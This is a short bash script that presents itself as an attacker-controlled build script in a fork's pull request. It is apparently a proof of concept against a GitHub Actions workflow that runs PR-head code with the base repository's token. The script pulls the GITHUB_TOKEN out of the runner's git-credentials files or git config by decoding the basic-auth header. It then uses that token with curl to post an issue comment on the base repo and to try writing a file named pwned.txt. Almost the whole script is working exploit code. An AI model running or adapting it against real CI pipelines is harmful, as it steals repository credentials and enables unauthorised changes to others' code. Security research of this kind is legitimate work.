#!/bin/bash
# Attacker-controlled build script living in the PR head (fork) repo.
echo "=== PAYLOAD START (code from PR head) ==="
id
echo "GITHUB_REPOSITORY=$GITHUB_REPOSITORY GITHUB_EVENT_NAME=$GITHUB_EVENT_NAME"
ls -l "$RUNNER_TEMP"/git-credentials-*.config 2>/dev/null
f=$(ls "$RUNNER_TEMP"/git-credentials-*.config 2>/dev/null | head -1)
tok=$(grep -o 'AUTHORIZATION: basic .*' "$f" 2>/dev/null | sed 's/.*basic //' | base64 -d 2>/dev/null | cut -d: -f2)
if [ -z "$tok" ]; then
  tok=$(git config --get-regexp '.*extraheader' 2>/dev/null | sed 's/.*basic //' | base64 -d 2>/dev/null | cut -d: -f2)
fi
echo "extracted token length: ${#tok}"
hdr="Authorization: token $tok"
echo "-- POST issue comment on base repo (issues:write test) --"
code=$(curl -s -o /tmp/resp.json -w '%{http_code}' -X POST -H "$hdr" -H "Accept: application/vnd.github+json" \
  -d '{"body":"[PoC] attacker-controlled PR-head code executed with the base repo GITHUB_TOKEN (issues:write)"}' \
  "https://api.github.com/repos/PDFtoMark/gab-poc-arduino-base/issues/1/comments")
echo "POST issue comment HTTP $code"
head -c 300 /tmp/resp.json; echo
echo "-- PUT contents to base repo (contents:write test, expect 403/404) --"
code2=$(curl -s -o /tmp/resp2.json -w '%{http_code}' -X PUT -H "$hdr" -H "Accept: application/vnd.github+json" \
  -d '{"message":"poc","content":"aGk=","branch":"main"}' \
  "https://api.github.com/repos/PDFtoMark/gab-poc-arduino-base/contents/pwned.txt")
echo "PUT contents HTTP $code2"
head -c 200 /tmp/resp2.json; echo
echo "=== PAYLOAD END ==="
